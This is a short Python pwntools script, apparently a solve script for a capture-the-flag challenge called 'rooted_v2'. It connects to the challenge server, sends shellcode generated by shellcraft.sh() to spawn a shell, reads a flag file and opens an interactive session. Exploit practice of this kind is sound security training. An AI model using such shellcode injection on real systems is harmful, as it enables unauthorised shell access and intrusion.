#!/usr/bin/env python3


from pwn import *

BINARY = "./rooted_v2"
ADDR = "chal.b01lers.com"
PORT = 7002

splash()
elf = context.binary = ELF(BINARY)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()
    io.sendlineafter("tsh> ", "/bin/.admin_check")
    payload = asm(shellcraft.sh()) + b"\x1a"
    io.sendline(payload)
    io.sendline("/bin/cat /home/rooted/flag.txt")
    io.interactive()


if __name__ == "__main__":
    solve()
